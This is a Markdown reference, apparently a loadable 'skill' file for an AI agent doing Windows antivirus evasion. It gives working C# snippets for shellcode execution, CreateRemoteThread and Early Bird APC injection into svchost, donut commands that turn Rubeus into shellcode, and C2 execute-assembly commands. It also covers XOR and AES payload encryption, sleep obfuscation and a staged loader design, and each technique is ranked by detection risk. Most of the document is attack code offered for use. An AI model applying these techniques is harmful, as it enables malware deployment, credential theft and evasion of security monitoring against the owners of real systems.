# Shellcode Execution & Process Injection — Complete Reference

> **Belongs to**: `windows-av-evasion` skill
> **Load when**: Need to execute shellcode or inject into remote processes

## .NET Assembly Loading (Pre-execution)

### In-Memory Assembly.Load

```csharp
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
// Or download from URL, decrypt from resource
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

### Donut — Convert .NET Assembly to Shellcode

```bash
# Generate shellcode from .NET EXE
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main

# With parameters
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"

# Then load shellcode via any injection technique below
```

### execute-assembly (C2 Framework)

```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast

# Sliver
execute-assembly /path/to/SharpHound.exe -c all

# Havoc
dotnet inline-execute /path/to/tool.exe args
```

---

## Shellcode Execution (Local)

### VirtualAlloc + Callback (Avoids CreateThread)

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
// Use callback API instead of CreateThread (less monitored)
EnumWindows(addr, IntPtr.Zero);
```

**Callback APIs for shellcode execution**: `EnumWindows`, `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats` — all accept function pointers that can point to shellcode.

---

## Process Injection (Remote)

| Technique | APIs Used | Detection Risk | Notes |
|---|---|---|---|
| **CreateRemoteThread** | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | High | Classic, heavily monitored |
| **NtMapViewOfSection** | NtCreateSection, NtMapViewOfSection | Medium | Shared memory, less common |
| **Process Hollowing** | CreateProcess (SUSPENDED), NtUnmapViewOfSection, WriteProcessMemory, ResumeThread | Medium | Replace process image |
| **Thread Hijacking** | SuspendThread, SetThreadContext, ResumeThread | Medium | Modify existing thread |
| **Early Bird** | CreateProcess (SUSPENDED), QueueUserAPC, ResumeThread | Low-Medium | APC before main thread |
| **Phantom DLL Hollowing** | Map DLL section, overwrite with shellcode | Low | Uses legitimate DLL mapping |
| **Module Stomping** | LoadLibrary, overwrite .text section | Low | Backed by legitimate DLL |
| **Transacted Hollowing** | NtCreateTransaction, NtCreateSection | Low | No suspicious allocations |

### CreateRemoteThread (Basic Pattern)

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

### Early Bird APC Injection

```csharp
// Create suspended process
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);

// Allocate and write shellcode
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);

// Queue APC to main thread (runs before main entry point)
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

---

## Payload Encryption & Obfuscation

### Encryption Methods

```csharp
// AES encryption (preferred)
using Aes aes = Aes.Create();
aes.Key = key; aes.IV = iv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);

// XOR (simple, fast)
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= key[i % key.Length];

// RC4 (stream cipher, simple implementation)
```

### Sleep Obfuscation

Encrypt shellcode in memory during sleep to avoid memory scanners.

| Technique | Method |
|---|---|
| **Ekko** | ROP chain → encrypt heap/stack during sleep |
| **Foliage** | APC-based sleep with memory encryption |
| **DeathSleep** | Thread de-registration during sleep |

### Staged Loading

```
Stage 1: Small, encrypted loader (evades static analysis)
Stage 2: Download actual payload at runtime (encrypted)
Stage 3: Decrypt in memory → execute
```
